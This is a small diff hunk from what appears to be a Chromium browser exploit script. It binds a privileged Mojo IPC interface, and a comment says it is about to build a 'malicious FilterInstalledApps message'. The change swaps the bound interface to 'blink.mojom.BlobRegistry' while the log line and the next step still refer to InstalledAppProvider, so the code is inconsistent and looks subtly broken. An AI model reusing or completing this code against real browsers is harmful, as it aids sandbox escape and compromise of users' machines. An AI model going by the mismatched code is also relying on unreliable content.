@@ -19,7 +19,7 @@
             log('Got interface provider');
 
             // 2. Bind InstalledAppProvider directly
-            const handle = Mojo.bindInterface('blink.mojom.InstalledAppProvider', provider);
+            const handle = Mojo.bindInterface('blink.mojom.BlobRegistry', provider);
             log('Bound to InstalledAppProvider');
 
             // 3. Build the malicious FilterInstalledApps message
